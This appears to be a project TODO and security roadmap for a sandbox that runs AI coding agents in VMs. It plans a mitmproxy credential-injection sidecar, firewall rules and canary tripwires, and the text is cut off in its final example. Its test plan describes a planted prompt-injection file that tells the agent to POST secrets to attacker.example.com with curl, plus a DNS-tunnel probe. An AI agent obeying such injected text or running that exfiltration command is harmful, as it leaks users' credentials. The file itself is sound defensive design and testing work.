# TODO — outstanding items

Review state: refreshed after code and documentation review on 2026-06-15.
`uv run python -m compileall src tests` and `uv run pytest -q` pass
(`109 passed, 2 subtests passed`). Previously listed fixes for missing
`container` handling, worktree conflict teardown, failed-session integration
skips, stale worktree directories, and per-project default image tags are now
implemented and covered by tests, so they are no longer active TODOs.

## Immediate correctness and documentation

### `--prompt-text` with newlines or shell-hostile content rides an env var
- **Where:** `src/project_sandbox/cli.py` (`_build_session_command`) — prompts
  ≤ 4096 chars go through `container run --env PROJECT_SANDBOX_PROMPT=<text>`.
- **Problem:** multi-line or otherwise unusual prompt text depends on the
  `container` CLI and guest init faithfully round-tripping arbitrary env-var
  bytes (apple/container also logs full process environments to `vminitd.log`,
  see README troubleshooting — prompts may be sensitive). The long-prompt path
  already writes `.project-sandbox/prompts/prompt.txt` and bind-mounts it.
- **To do:** drop the env-var path entirely and always use the prompt-file
  mount for `--prompt-text` (one code path, no length threshold, nothing in the
  VM's environment/logs). Update entrypoint docs/tests accordingly.

### Document the generated default image tag
- **Where:** `src/project_sandbox/cli.py` (`_default_image_tag`) and
  `README.md`.
- **Problem:** the code now derives per-project tags of the form
  `project-sandbox-<project-name>-<8-char sha256>:latest`, but the README does
  not explain the default or when to use `--image-tag`.
- **To do:** add a short README note near the CLI options or build section
  documenting the generated tag format, the path-hash collision protection, and
  the `--image-tag` override.

### Document OpenSpec installation without implying project initialization
- **Where:** `README.md` and `src/project_sandbox/templates/Dockerfile.j2`.
- **Problem:** the README says OpenSpec is available, but it does not name the
  installed npm package or make clear that `openspec init` is not run
  automatically in user workspaces.
- **To do:** add a concise README note that generated images install
  `@fission-ai/openspec@latest` on `PATH`; users/projects must explicitly run
  OpenSpec initialization commands when they want workspace files.

### Extend the e2e smoke test for recently added generated assets
- **Where:** `scripts/e2e-test.sh`.
- **Problem:** renderer tests assert OpenSpec is installed, and unit tests cover
  devcontainer symlinks, but the portable e2e smoke test does not check
  `@fission-ai/openspec@latest` or the `claude-devcontainer` /
  `codex-devcontainer` symlinks.
- **To do:** add content checks for the OpenSpec install line and include the
  devcontainer-specific agent config symlinks in the e2e `SYMLINKS` list.

### Document firewall DNS/IP pinning limitations
- **Where:** `README.md` firewall section.
- **Problem:** the firewall resolves allowlisted domains only once at container
  start and pins those IPs in ipsets. CDN-backed endpoints
  (`api.anthropic.com`, `claude.ai`, npm, etc.) can rotate IPs during long-lived
  sessions, causing allowed services to fail later. This is not currently
  documented.
- **To do:** add a short limitation note explaining one-time DNS resolution and
  IP drift. Do not add periodic re-resolution to the iptables script; the
  longer-term fix is the credential-filtering proxy below.

## Host / container validation

### Firewall: allow all `resolv.conf` resolvers, not just the first
- **Where:** `src/project_sandbox/templates/init-firewall.sh.j2` — the `DNS4`/`DNS6`
  `awk` lines use `... {print $2; exit}`, so only the first IPv4 and first IPv6
  nameserver are pinned; the NAT-preservation `grep` and the `ACCEPT` rules use
  those single values.
- **Current state:** the docs (`README.md`) were updated to say "the first
  resolver" so they match the script. If a VM's `resolv.conf` lists multiple
  resolvers, the others are dropped (rare in the apple/container & devcontainer
  VMs, which typically have one).
- **To do:** collect all `nameserver` entries into lists and emit NAT/ACCEPT
  rules for each, then revert the README wording to "resolver(s)". This touches
  the network security boundary, so it must be exercised on a machine with
  iptables — do **not** ship it unverified.

### Verify `--timeout` actually tears down the apple/container VM
- **Where:** `src/project_sandbox/session.py` (`_terminate_process_group`).
- **Current state:** on timeout we now SIGTERM→SIGKILL the whole `container run`
  process group (not just the immediate child), which should let `--rm` clean up.
  README reflects this.
- **To do:** confirm on a host with apple/container that the guest VM is gone
  after a timeout. If the VM lingers, give the run a known name/id and
  `container stop`/`kill` it explicitly in the timeout path.

## Deferred cleanup

### Worktree directory name collision
- **Where:** `src/project_sandbox/worktree.py` (`path_for`) maps a branch to a dir
  via `branch.replace("/", "-")`, so `feat/x` and `feat-x` resolve to the same
  worktree directory.
- **To do:** add a disambiguating suffix (e.g. a short branch-name hash) if this
  ever bites. Deferred as low-probability; not worth the churn now. (Note: the
  stale-directory `setup` fix above makes this collision fail loudly instead of
  silently reusing the wrong worktree, which removes most of the risk.)

## Security roadmap

### Canary token tripwires

A standalone detection layer, independent of the proxy's inline policy below. The
proxy prevents exfiltration in real time; canary tokens tell you *after the fact*
if something got out and was used anywhere in the world.

- **Plant Thinkst Canarytokens** (free at `canarytokens.org`; the AWS API Key
  canary is the gold-standard tripwire) inside the agent VM at the locations a
  thief would actually grab: `/workspace/.env`, `/workspace/.aws/credentials`,
  `~/.bash_history`. If an attacker exfiltrates and *uses* one, an out-of-band
  alert fires at `canarytokens.org` — TruffleHog-style `sts:GetCallerIdentity`
  verification calls trip the AWS canary, which is how Grafana Labs detected a
  real 2025 GitHub Actions breach (their public write-up, 25 Aug 2025).
- **Custom sentinel string**: plant a fixed string (e.g.
  `SENTINEL_PROJECT_SANDBOX = "ps-sentinel-7H3kQ9wPxL"`) alongside the canaries.
  The proxy does a plain **exact-match** on outbound request bodies for this
  string (no entropy/detector scanning); if seen, it logs at FATAL and force-kills
  the agent session. This is a cheap last-ditch tripwire, not DLP.
- **To do:** token-provisioning UX (how a user mints/registers a canary), where to
  plant them per agent image, and the hook in the proxy addon for the sentinel
  exact-match kill-switch. Add an E2E test that plants an AWS canary, prompts the
  agent toward a `git push`, and asserts the proxy's allowlist blocks the push so
  the canary does **not** fire; a negative control (allowlist disabled) confirms
  it *would* fire.

### project-sandbox Credential-Filtering Sidecar Proxy

**Recommendation in one sentence:** Build the sidecar as a second `apple/container`
VM running **mitmproxy 12 (`mitmdump`) with a Python addon**, attached to a
dedicated `container network create proxy-net-<project>` user-defined network on
macOS 26+, with the agent VM's iptables/ip6tables locked to ALLOW only the proxy's
IP on 8080 (everything else DROP), explicit `HTTPS_PROXY` env vars in the agent
(defense-in-depth, not the trust boundary), the mitmproxy CA baked into the agent
image at build time, and a YAML policy on the host that injects credentials drawn
from a single host `.env` file into outbound requests on allowlisted hosts.

#### TL;DR

- **Run mitmproxy in a second `apple/container` VM** on a user-defined network
  (macOS 26+), force the agent VM through it via iptables-only-ALLOW-proxy-IP +
  explicit `HTTPS_PROXY` env. This gives VM-level isolation of the secret store
  plus a mature addon API for credential injection. mitmproxy is the chosen and
  only engine — it has a stable Python addon API, HTTP/1.1, HTTP/2, WebSocket and
  HTTP/3 support, SSE streaming inspection, and a copy-and-modify precedent in
  `mattolson/agent-sandbox`'s `enforcer.py`.
- **Secrets and config live in one host `.env` file** (see next section). The
  proxy holds it; the agent VM gets only sentinel placeholders. Real
  Anthropic/GitHub/OpenAI/AWS credentials never enter the agent VM's process
  table, env, `/proc`, or filesystem — they are spliced in by the mitmproxy addon
  on a verified TLS leg to an allowlisted host (the same pattern microsandbox uses
  at the network layer and Infisical's Agent Vault uses at the HTTPS_PROXY layer).
- **We do not do live secret scanning / DLP** (no trufflehog/gitleaks/detect-
  secrets entropy detectors on outbound bodies). The boundary is destination
  allowlist + credential non-possession, backed by the canary tripwires above.

---

#### Credentials live in a single `.env` file

Instead of per-secret files, use **one `.env` file on the host** holding every
environment variable and secret the agent stack needs:

- Default location `~/.config/project-sandbox/secrets.env` (mode 0600), overridable
  per-project via `.project-sandbox/secrets.env` or `--env-file PATH`.
- Standard dotenv syntax (`KEY=value`, `#` comments) — the same format Claude Code,
  Codex, and friends already consume, so it is the single source of truth for both
  **config** vars and **secret** vars.
- This unification is what lets us point Claude Code (or any client) at **Bedrock**
  with no code change — just set the right vars in `.env`:
  ```dotenv
  # Anthropic direct
  ANTHROPIC_API_KEY=sk-ant-...

  # …or Bedrock instead (no API key)
  CLAUDE_CODE_USE_BEDROCK=1
  AWS_REGION=us-east-1
  AWS_ACCESS_KEY_ID=AKIA...
  AWS_SECRET_ACCESS_KEY=...

  OPENAI_API_KEY=sk-...
  GITHUB_TOKEN=ghp_...
  ```

The policy classifies each variable:

- **config** — non-secret (e.g. `CLAUDE_CODE_USE_BEDROCK`, `AWS_REGION`,
  `ANTHROPIC_BASE_URL`). Passed straight through into the agent VM's environment.
- **secret** — held back. The agent VM gets a placeholder (`PLACEHOLDER_ANTHROPIC`,
  etc.); the proxy injects the real value on the wire.

For Bedrock the SigV4 signing happens **at the proxy**: `CLAUDE_CODE_USE_BEDROCK=1`
and `AWS_REGION` reach the agent as config, while `AWS_ACCESS_KEY_ID` /
`AWS_SECRET_ACCESS_KEY` are secrets the proxy uses to sign the upstream Bedrock
request — so the agent VM never sees AWS credentials, the same way it never sees an
Anthropic key.

The CLI reads the `.env` once, partitions it into config (injected into the agent
VM env) and secret (replaced with placeholders in the agent VM env), and bind-mounts
the **full `.env` read-only into the proxy VM only**, never the agent VM.

---

#### Architecture Diagram

```
                 macOS host (Apple Silicon, macOS 26+)
 ┌─────────────────────────────────────────────────────────────────────────┐
 │                                                                         │
 │  ~/.config/project-sandbox/                 ~/Library/Application       │
 │    ├─ secrets.env         (600)             Support/com.apple.container │
 │    └─ proxy-ca/                               (apple/container state)   │
 │        ├─ ca.crt                                                       │
 │        └─ ca.key          (600)                                        │
 │                                                                         │
 │  $ project-sandbox run --proxy claude ./my-repo                         │
 │           │                                                             │
 │           ▼                                                             │
 │   ┌──────────────────────────────────────────────────────────────────┐  │
 │   │  apple/container user-defined network: proxy-net-<projectid>     │  │
 │   │  (192.168.65.0/24 — created with `container network create`)     │  │
 │   │                                                                  │  │
 │   │   ┌─────────────────────────┐       ┌───────────────────────┐    │  │
 │   │   │  AGENT VM               │       │  PROXY VM             │    │  │
 │   │   │  image: agent-claude    │       │  image: proxy-sidecar │    │  │
 │   │   │                         │       │                       │    │  │
 │   │   │  /etc/ssl/certs/        │       │  mitmdump -s policy.py│    │  │
 │   │   │    project-sandbox-ca.. │       │   --mode regular      │    │  │
 │   │   │  ca-certificates (baked)│       │   --listen-port 8080  │    │  │
 │   │   │                         │       │                       │    │  │
 │   │   │  ENV (config + sentinels│       │  Mounts (RO from host):│   │  │
 │   │   │   from .env):           │       │   /run/secrets.env ◄──│────┤  │
 │   │   │    HTTPS_PROXY=         │       │   /etc/policy/policy. │    │  │
 │   │   │      http://proxy:8080  │       │     yaml              │    │  │
 │   │   │    ANTHROPIC_API_KEY=   │ TLS   │   /etc/proxy-ca/      │    │  │
 │   │   │      PLACEHOLDER_ANTH.. │──────►│     ca.crt + ca.key   │    │  │
 │   │   │    CLAUDE_CODE_USE_     │ HTTPS │                       │    │  │
 │   │   │      BEDROCK=1 (config) │ on    │  Allowlist (broad):   │    │  │
 │   │   │                         │ :8080 │   api.anthropic.com   │    │  │
 │   │   │  iptables OUTPUT:       │       │   bedrock.*.aws.com   │    │  │
 │   │   │    -d 192.168.65.2 -j   │       │   api.openai.com      │    │  │
 │   │   │       ACCEPT (proxy IP) │       │   api.github.com      │    │  │
 │   │   │    -d 169.254.* DROP    │       │   registry.npmjs.org  │    │  │
 │   │   │    default DROP         │       │   ...                 │    │  │
 │   │   └─────────────────────────┘       └───────────┬───────────┘    │  │
 │   │                                                 │                │  │
 │   └─────────────────────────────────────────────────┼────────────────┘  │
 │                                                     │                   │
 │                                                     ▼                   │
 │                                            macOS vmnet0 ──► Internet    │
 │                                                                         │
 └─────────────────────────────────────────────────────────────────────────┘

Trust boundary 1: agent VM ↔ proxy VM. Agent VM cannot read proxy VM
                  memory/disk because they are separate Apple VFW VMs.
Trust boundary 2: proxy VM ↔ host. Proxy VM mounts only secrets.env +
                  policy + CA, read-only; no other host secrets.
```

---

#### Details

##### A. Architecture Recommendation

##### A.1 Topology between two `apple/container` VMs

Use a **user-defined network created on the host** with `container network create
proxy-net-<projectid>`. Container-to-container networking on `apple/container`
requires **macOS 26 (Tahoe)**; on macOS 15 each container gets its own VM but cannot
directly talk to siblings, so `project-sandbox` must declare a minimum host
requirement of macOS 26 when `--proxy` is set. apple/container's release notes
confirm subnet support, `network=none`, and working proxies from 0.6.0 onward, with
`--mtu`, multiple network plugins, and a Network-attachment encoder/decoder polished
on 0.11+ (current as of May 2026).

Concretely, the CLI runs:

```bash
container network create --subnet 192.168.65.0/24 proxy-net-<projectid>
container run -d --name proxy-<projectid>  --network proxy-net-<projectid> ...
container run -d --name agent-<projectid>  --network proxy-net-<projectid> ...
```

Apple's `container` does not yet let you pin IP addresses (open issue #282), so
`project-sandbox` reads the proxy IP after start via
`container inspect <name> | jq '.networks[0].ipv4Address'`. The agent VM's
`init-firewall.sh` is then templated with that IP at container start. DNS is pinned
to the in-VM resolver as today; additionally `project-sandbox` calls
`container system dns create project-sandbox.local` and
`container system dns default set project-sandbox.local` so that
`proxy.project-sandbox.local` resolves inside the agent VM (inter-container DNS is
macOS 26 only).

Since the `.env` is global to a user, the proxy container can be shared across
projects (e.g. via a lockfile in the project-sandbox config dir).

##### A.2 How to force all traffic through the proxy

**Belt-and-braces — explicit `HTTPS_PROXY`/`HTTP_PROXY`/`ALL_PROXY` env in the agent
shell, *plus* iptables that allow only the proxy IP.** The env vars are how mitmproxy
expects clients to opt in to "regular" forward-proxy mode (where it sees CONNECT for
HTTPS), and they are honored by Node 22+ (Claude Code), Go's `net/http` (gh-copilot),
and Rust's `reqwest`.

The **iptables-only-proxy-IP rule is the trust boundary**. Env vars are convenience:
they make HTTPS CONNECT work cleanly so the proxy sees the SNI. Without env vars, a
transparent-mode mitmproxy still works (it reads the original destination via
`getsockopt(SO_ORIGINAL_DST)` after a DNAT REDIRECT), and that is the fallback for
binaries that ignore env vars. So we install two iptables rules:

```bash
# (1) Default-DROP everything to anywhere except proxy IP
iptables -A OUTPUT -d ${PROXY_IP} -p tcp --dport 8080 -j ACCEPT
iptables -A OUTPUT -j REJECT

# (2) For anything that bypassed HTTPS_PROXY and tried direct 443,
#     transparently NAT it to the proxy so it gets the SNI.
iptables -t nat -A OUTPUT -p tcp --dport 443 ! -d ${PROXY_IP} \
   -j DNAT --to-destination ${PROXY_IP}:8080
iptables -t nat -A OUTPUT -p tcp --dport 80  ! -d ${PROXY_IP} \
   -j DNAT --to-destination ${PROXY_IP}:8080
```

The proxy runs `--mode regular@8080 --mode transparent@8081` so the same `mitmdump`
handles both flows under the same policy.

##### A.3 Where to terminate the iptables firewall

**Keep iptables on the agent VM, but its job changes.** Today it's a domain-pinned
allowlist; in the proposed design it's a *single-destination* allowlist — only the
proxy IP on TCP/8080. The value of keeping it (rather than delegating fully to the
proxy):

1. If the proxy crashes, the agent VM **cannot fall through to direct egress** — it
   fails closed.
2. Cloud metadata (169.254.169.254) and link-local IPv6 (fe80::/10) stay blocked at
   the agent VM regardless of policy.
3. IPv6 mirroring/disable from the current `init-firewall.sh` stays as-is.

The agent VM's domain-pinned iptables (today's design) becomes **redundant** and
should be removed when `--proxy` is set — the proxy does the L7 host policy. Keep a
coarse domain-pinned iptables on the *proxy* VM as a first filter.

---

##### B. Proxy Engine: mitmproxy

mitmproxy 12 (`mitmdump`) is the chosen engine. It provides:

- A stable Python addon API loaded with `-s` (more mature than alternatives for
  request/response rewriting); `loader.add_option`; YAML config.
- HTTP/1.1, HTTP/2, WebSocket, and HTTP/3-over-QUIC (full HTTP/3 in transparent /
  reverse / WireGuard modes since mitmproxy 11.0.0, Oct 2024; regular CONNECT mode is
  TCP-only so QUIC is forced-downgraded — see §E).
- SSE streaming response inspection that works for Anthropic's `text/event-stream`.
- A copy-and-modify precedent in `mattolson/agent-sandbox`'s `enforcer.py`.

##### What to borrow from `mattolson/agent-sandbox`

- `enforcer.py` addon shape: `http_connect` (CONNECT-time host check, returns 403
  before the TLS handshake), `request` (post-TLS enforcement of scheme/method/path/
  query and credential injection), and `response` (streaming passthrough).
- Two-key YAML policy: `services:` (presets like `claude`, `codex`, `gemini`,
  `copilot`, `github`) and `domains:` (per-host rules). Already battle-tested for our
  exact problem.
- `transform.request.headers.<H>.secret: <id>` — except `<id>` now names a **key in
  the `.env` file** rather than a standalone file. IDs validated against
  `[A-Za-z0-9._-]+` (env var name charset).
- `transform.request.on_existing_header: fail | replace`. Default `replace` here,
  since the agent inserts a placeholder we intend to overwrite.
- `client_shim: { kind: git-askpass }` for GitHub: emits a `credential_shim:` block
  and an in-container shell-init that sets `GIT_ASKPASS` to a script returning a
  sentinel password.

##### What we add / change vs agent-sandbox

- `secret:` resolves against the single host `.env` (key lookup), not a per-secret
  file.
- A `sign:` transform for SigV4 (Bedrock / other AWS upstreams): the proxy computes
  the SigV4 `Authorization` header from `.env` AWS creds and the request, so the
  agent never holds AWS keys.
- A `passthrough:` list for hosts that must not be TLS-intercepted (cert-pinned
  endpoints).
- `on_proxy_failure: fail_closed` — explicit, even though the agent VM iptables rule
  already enforces fail-closed, so an operator can never accidentally enable a
  permissive bypass.
- **No `body_scan` / DLP block.** We deliberately do not run trufflehog/gitleaks/
  detect-secrets style entropy detectors on outbound bodies. The proxy's only body
  interaction is the canary **sentinel exact-match** kill-switch (see the canary
  section above).

---

##### C. Policy / Rule Format

We adopt agent-sandbox's `services:`/`domains:` schema for request-enforcement and
credential injection (so projects can share policies between the two tools). The file
lives at `<project>/.project-sandbox/proxy/policy.yaml`, mounted read-only at
`/etc/proxy/policy.yaml` in the proxy VM. It is generated on `project-sandbox init`
with the default allowlist below; `project-sandbox edit policy` opens it in `$EDITOR`
and `project-sandbox proxy reload` sends `SIGHUP` for atomic swap. Loading is
in-process Python (`yaml.safe_load`) with strict-mode validation against a JSON
Schema generated from the addon source.

##### Worked example: default policy

```yaml
# .project-sandbox/proxy/policy.yaml
# Generated by `project-sandbox init claude`.

services:
  - claude            # api.anthropic.com, claude.ai, code.claude.com, platform.claude.com
  - codex             # api.openai.com, auth.openai.com, chatgpt.com
  - copilot           # GitHub Copilot endpoints
  - name: github
    repos:
      - acme/my-service
    git:
      access: readwrite
      auth:
        secret: GITHUB_TOKEN          # key in secrets.env
        client_shim:
          kind: git-askpass
    api:
      access: read

domains:
  # npm — no service preset, spelled out explicitly.
  - host: registry.npmjs.org
    rules:
      - schemes: [https]
        methods: [GET, HEAD]
        path:
          prefix: /
  - host: "*.npmjs.org"
    rules:
      - schemes: [https]
        methods: [GET, HEAD]

  # Anthropic Messages API — credential injection from secrets.env.
  - host: api.anthropic.com
    transform:
      request:
        headers:
          x-api-key:
            secret: ANTHROPIC_API_KEY  # key in secrets.env
            transform:
              type: literal            # Anthropic's non-bearer x-api-key header
        on_existing_header: replace    # agent inserts PLACEHOLDER_ANTHROPIC; proxy replaces
    rules:
      - schemes: [https]
        methods: [POST]
        path:
          prefix: /v1/

  # Amazon Bedrock — SigV4 signed at the proxy from secrets.env AWS creds.
  - host: "bedrock-runtime.*.amazonaws.com"
    transform:
      request:
        sign:
          type: sigv4
          service: bedrock
          access_key_id: AWS_ACCESS_KEY_ID       # keys in secrets.env
          secret_access_key: AWS_SECRET_ACCESS_KEY
          region_from: AWS_REGION
    rules:
      - schemes: [https]
        methods: [POST]
        path:
          prefix: /

  # OpenAI.
  - host: api.openai.com
    transform:
      request:
        headers:
          Authorization:
            secret: OPENAI_API_KEY
            transform:
              type: bearer
        on_existing_header: replace
    rules:
      - schemes: [https]
        methods: [POST]
        path:
          prefix: /v1/

  # GitHub API not covered by the `github` service preset.
  - host: api.github.com
    rules:
      - schemes: [https]
        methods: [GET, POST]
        path:
          prefix: /

  # GitHub hosts for `git clone`.
  - host: "*.github.com"
    rules:
      - schemes: [https]
        methods: [GET, HEAD]

# Hosts that must not be TLS-intercepted. Use sparingly — falls back to
# CONNECT-level allow-only (no credential injection), which means the agent must
# hold the token itself, defeating the threat model, so the CLI prints a warning.
passthrough: []

# Fail-closed default — if mitmproxy panics or policy fails to load, all traffic
# returns 503. The iptables-only-proxy-IP rule on the agent VM enforces this.
on_proxy_failure: fail_closed
```

---

##### D. Secret Material and Root CA Management

##### Where credentials live on the host

A single `.env` file at `~/.config/project-sandbox/secrets.env` (mode 0600,
containing dir 0700), overridable per-project (`.project-sandbox/secrets.env`) or via
`--env-file`. The `secret:` / `sign:` keys in the policy reference variable names in
this file. The file is bind-mounted read-only into the **proxy VM only**.

For per-invocation ephemeral secrets (e.g. a short-lived PAT minted from
`gh auth token`), the CLI can write an overlay `.env` into a `tmpfs`-backed
`/tmp/project-sandbox-<uid>/` and merge it over the persistent file in the proxy VM.

##### How it gets into the proxy VM

`apple/container` has no BuildKit-style `--mount=type=secret`. Two paths:

1. **Runtime bind-mount, read-only** (preferred):
   ```
   container run \
     --mount type=bind,source=$HOME/.config/project-sandbox/secrets.env,target=/run/secrets.env,readonly \
     --mount type=bind,source=$HOME/.config/project-sandbox/proxy-ca,target=/etc/proxy-ca,readonly \
     ...
   ```
   Mounted into the **proxy VM only**, never the agent VM.

2. **macOS Keychain** (opt-in via `--keychain`): the CLI reads individual values
   with `security find-generic-password -s project-sandbox.<key> -w`, assembles an
   in-memory `.env`, writes it to a `tmpfs`-backed file in
   `/tmp/project-sandbox-<uid>/`, and mounts that. Strong UX win (no plaintext at rest
   in dotfiles) at the cost of an authn prompt. Default to the filesystem `.env` for
   hackability.

**Never bake secrets into the proxy image** — the threat model assumes a malicious
agent may attempt OCI-image exfiltration (e.g. via `npm` post-install hooks), so no
secret may sit in any image layer.

##### Root CA generation, trust, and rotation

- **Generation:** `project-sandbox proxy ca init` runs
  `openssl ecparam -genkey -name secp384r1 …` plus `openssl req -x509 -new -nodes …
  -subj '/CN=project-sandbox proxy CA <projectid>'` and writes `ca.crt` (0644) and
  `ca.key` (0600) into `~/.config/project-sandbox/proxy-ca/`. CA is per-project so a
  compromised CA does not compromise other projects.
- **Trust in the agent VM:** baked at image build time. The generated `Dockerfile`
  includes:
  ```
  COPY proxy-ca.crt /usr/local/share/ca-certificates/project-sandbox-proxy-ca.crt
  RUN update-ca-certificates
  ENV NODE_EXTRA_CA_CERTS=/usr/local/share/ca-certificates/project-sandbox-proxy-ca.crt
  ENV REQUESTS_CA_BUNDLE=/etc/ssl/certs/ca-certificates.crt
  ENV CURL_CA_BUNDLE=/etc/ssl/certs/ca-certificates.crt
  ENV SSL_CERT_FILE=/etc/ssl/certs/ca-certificates.crt
  ENV SSL_CERT_DIR=/etc/ssl/certs
  ENV AWS_CA_BUNDLE=/etc/ssl/certs/ca-certificates.crt
  ENV GIT_SSL_CAINFO=/etc/ssl/certs/ca-certificates.crt
  ```
  These cover the per-runtime trust-store knobs: Node honors `NODE_EXTRA_CA_CERTS`
  (or `NODE_USE_SYSTEM_CA=1` on Node ≥ 22.19); Python `requests` honors
  `REQUESTS_CA_BUNDLE`; curl honors `CURL_CA_BUNDLE`; Go reads
  `/etc/ssl/certs/ca-certificates.crt` via `crypto/x509.SystemCertPool()`; Rust
  `rustls` honors `SSL_CERT_FILE`/`SSL_CERT_DIR`; AWS SDKs honor `AWS_CA_BUNDLE`.
- **Rotation:** `project-sandbox proxy ca rotate` issues a new CA and rebuilds the
  agent image. The CLI tracks CA expiry (default 90 days) and warns at 14 days.

##### When an agent CLI pins certificates

Real-world Claude Code, Codex CLI, OpenCode, and gh-copilot do **not** currently
certificate-pin to the public CA system. Sigstore tooling and some npm signature
verification can. The policy's `passthrough:` list is the escape hatch — those hosts
are tunneled raw and the proxy enforces only the destination allowlist at the CONNECT
layer. `project-sandbox` prints a warning at `proxy reload` naming every passthrough
host and explaining the loss of credential injection for it.

---

##### E. Endpoints That Don't Fit MITM

- **Certificate-pinned endpoints:** add to `passthrough:`. The agent must hold the
  real credential for these (we cannot inject), so **cert-pinned endpoints
  fundamentally break our threat model and the operator must explicitly accept the
  trade-off.**
- **gRPC over HTTP/2:** mitmproxy handles HTTP/2 cleanly. Anthropic and OpenAI do not
  use gRPC.
- **WebSocket:** mitmproxy 11+ supports WebSocket (`websocket_message` hook,
  `inject.websocket`). Anthropic streaming uses SSE, not WebSockets.
- **SSE (Anthropic streaming `messages.create`):** mitmproxy treats `text/event-stream`
  as a regular chunked response; we set `flow.response.stream = True` in
  `responseheaders` so the body streams through to the agent without buffering. There
  is no DLP scan on the stream — only the optional sentinel exact-match.
- **HTTP/3 / QUIC:** regular (CONNECT) mode does not support QUIC. **Block QUIC at
  iptables** (`-A OUTPUT -p udp --dport 443 -j REJECT`) so clients downgrade to
  HTTP/1.1 or HTTP/2 over TCP. Re-enable only if a critical upstream requires it.
- **DNS:** unchanged — pinned in-VM resolver.

---

##### F. Integration with `project-sandbox` CLI

##### New flags

```
project-sandbox <subcommand> [...]
  --proxy[=auto|on|off]              Default 'auto' if .project-sandbox/proxy/ exists,
                                     else 'off'. 'on' fails if proxy can't start.
  --env-file PATH                    Override the default secrets.env path.
  --credential-rule HOST=ENV_KEY     Shortcut for one-line policy override.
                                     Repeatable. Example:
                                     --credential-rule api.anthropic.com=ANTHROPIC_API_KEY
  --credential-policy PATH           Override the default policy.yaml path.
  --proxy-image TAG                  Override the proxy sidecar image.
  --passthrough HOST                 Add a runtime passthrough host. Repeatable.
                                     Prints a security warning.
  --keychain                         Assemble secrets.env from macOS Keychain on each
                                     invocation instead of reading from disk.
```

##### File layout

```
<project>/
├── .project-sandbox/
│   ├── Dockerfile                  # agent VM image (already exists)
│   ├── init-firewall.sh            # already exists, now templated with $PROXY_IP
│   ├── claude-config.json          # already exists
│   └── proxy/                      # NEW
│       ├── Dockerfile              # mitmproxy 12 + Python addon
│       ├── policy.yaml             # the YAML above
│       ├── policy.lock.json        # rendered/validated policy (machine-written)
│       ├── addon/
│       │   ├── enforcer.py         # ported & extended from agent-sandbox
│       │   ├── injector.py         # credential injection + SigV4 signing
│       │   └── service_catalog.py  # claude/codex/gemini/copilot/github presets
│       └── ca/
│           └── .gitignore          # ca.crt symlinked from host, never committed
```

##### Devcontainer mode

The devcontainer spec supports sidecars only via Docker Compose (`dockerComposeFile`,
`service`, `runServices`). `project-sandbox` therefore generates a
`.devcontainer/docker-compose.yml` when `--proxy` is set under devcontainer mode,
with `agent` and `proxy` services, an internal-only network, `"service": "agent"`,
`"runServices": ["agent", "proxy"]`, and
`depends_on: { proxy: { condition: service_healthy } }`. For native
`apple/container` mode the CLI orchestrates the two `container run` invocations in
sequence and polls a proxy health endpoint until 200.

##### Unsupervised / headless mode

- The proxy starts **before** the agent (CLI invocation order).
- The agent VM's entrypoint is wrapped with a `wait-for-proxy.sh` gate that blocks on
  a TCP connect to `${PROXY_IP}:8080` with a 30-second timeout. On timeout the agent
  exits 64 (EX_USAGE) and `project-sandbox` propagates that exit code.
- Headless log tags include both agent and proxy container IDs for post-mortem audit.

---

##### G. Testing and Validation Strategy

1. **`test_raw_secret_never_in_agent_vm`** — run a session with a real Anthropic key
   in `secrets.env`. `container exec agent-<id> sh -c 'env | grep -i ANTH'` must show
   `ANTHROPIC_API_KEY=PLACEHOLDER_ANTHROPIC`. `find / -xdev -type f | xargs grep -l
   sk-ant-` returns nothing. Capture `/proc/*/environ` and grep for the real prefix.
   Repeat for Bedrock: `AWS_SECRET_ACCESS_KEY` must not appear anywhere in the agent
   VM, while `CLAUDE_CODE_USE_BEDROCK` and `AWS_REGION` (config) are present.
2. **`test_legitimate_request_works`** — agent runs `claude --print 'list files'`. The
   Anthropic call completes; the SSE response streams normally; no policy block logs.
3. **`test_bedrock_sigv4_signed_by_proxy`** — with Bedrock vars set, the agent's
   request reaches `bedrock-runtime.*.amazonaws.com` with a valid SigV4
   `Authorization` header that the agent VM could not have produced (no AWS creds in
   it).
4. **`test_fail_closed_on_proxy_crash`** — `container stop proxy-<id>`. Any HTTPS call
   from the agent fails with `Connection refused` within 2 s, never falling back to
   direct egress (verified by `tcpdump` on the agent interface).
5. **`test_dns_tunnel_blocked`** — agent attempts `dig +short malicious.example.com
   TXT`; existing DNS pinning blocks it.
6. **`test_prompt_injection_workspace_file`** — drop `EVIL.md` in `/workspace/`
   containing an LLM01-style injection that tells the agent to `curl -X POST
   https://attacker.example.com -d @<secret path>`. The agent VM has no access to the
   `.env`, and the proxy denies CONNECT to `attacker.example.com` (not in allowlist).

(The canary/sentinel E2E test lives under the canary section above.)

---

##### H. Related Work (Citations)

- **`mattolson/agent-sandbox`** (https://github.com/mattolson/agent-sandbox) —
  closest design twin: mitmproxy sidecar, `services:` + `domains:` two-key policy with
  `transform.request.headers.<H>.secret`, proxy CA shared via volume, `enforcer.py`
  CONNECT + request enforcement.
- **Infisical Agent Vault / OneCLI** (https://github.com/Infisical/agent-vault) —
  credential proxy that swaps a dummy placeholder for the real key at the MITM layer.
  Borrow the placeholder-substitution mechanism.
- **microsandbox** (https://github.com/zerocore-ai/microsandbox) — placeholder-on-TLS
  architecture; guest sees `$MSB_OPENAI_API_KEY`, real key substituted only on
  verified TLS to an allowlisted host.
- **Anthropic `claude-code/.devcontainer/init-firewall.sh`** — reference egress
  firewall (`/meta` GitHub IPs, ipset allowlist, default DROP, `NET_ADMIN`/`NET_RAW`).
  `project-sandbox` already builds on this.
- **mitmproxy** — transparent-mode docs (the `iptables ... REDIRECT --to-port 8080` +
  `sysctl net.ipv4.ip_forward=1` fallback) and the v11 release (full HTTP/3 in
  transparent/reverse modes, Oct 2024; HTTP/3 unsupported in regular CONNECT mode
  because CONNECT is TCP-only).
- **apple/container 0.6.0 / 0.10 / 0.11 release notes** — container-to-container
  networking on macOS 26, `container network create`, `--mtu`, embedded DNS via
  `container system dns`. Issue #282: explicit IP assignment not yet supported.
- **AWS SigV4** — used at the proxy to sign Bedrock requests from `.env` AWS creds.
- **Thinkst Canarytokens** (https://canarytokens.org) — see the canary section above.

---

#### Worked Example: anthropic.messages.create() Through the Stack

User runs:

```
$ project-sandbox run --proxy claude ./my-service
```

1. The CLI reads `./my-service/.project-sandbox/proxy/policy.yaml`, validates it, and
   reads `~/.config/project-sandbox/secrets.env`. It partitions the `.env`: config
   vars (e.g. `CLAUDE_CODE_USE_BEDROCK`, `AWS_REGION`) and secret vars (e.g.
